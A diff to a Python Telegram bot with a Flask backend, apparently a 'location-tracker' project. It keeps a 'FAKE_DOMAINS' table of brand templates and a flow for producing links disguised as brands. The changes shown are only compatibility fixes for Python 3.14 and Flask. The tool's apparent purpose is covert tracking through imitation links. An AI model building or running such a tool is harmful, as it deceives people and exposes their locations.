@@ -1,17 +1,30 @@
 import os
 import secrets
 import sqlite3
+import sys
+import pkgutil
+import asyncio
 from datetime import datetime
 from flask import Flask, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters, ConversationHandler
+
+# Fix for Python 3.14 - Flask compatibility
+if not hasattr(pkgutil, 'get_loader'):
+    import importlib
+    def get_loader(module_name):
+        try:
+            return importlib.util.find_spec(module_name).loader
+        except AttributeError:
+            return None
+    pkgutil.get_loader = get_loader
 
 # Configuration
 TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
 if not TELEGRAM_TOKEN:
     raise ValueError("No TELEGRAM_TOKEN set")
 
-BASE_URL = os.environ.get('BASE_URL', 'https://your-bot-name.onrender.com')
+BASE_URL = os.environ.get('BASE_URL', 'https://location-tracker-v2xk.onrender.com')
 
 # Brand Templates
 FAKE_DOMAINS = {
@@ -478,6 +491,13 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 def main():
+    # Fix for Python 3.14+ event loop issue
+    try:
+        loop = asyncio.get_running_loop()
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+    
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     
     conv_handler = ConversationHandler(
@@ -485,7 +505,6 @@ def main():
         states={
             BRAND_SELECTION: [
                 CallbackQueryHandler(brand_selection, pattern='^brand_'),
-                CallbackQueryHandler(new_link, pattern='^new_link$')
             ],
             WEBSITE_INPUT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_website),
@@ -501,7 +520,7 @@ def main():
     # Start Flask in background
     import threading
     port = int(os.environ.get('PORT', 5000))
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False)).start()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)).start()
     
     # Start bot
     application.run_polling(allowed_updates=Update.ALL_TYPES)
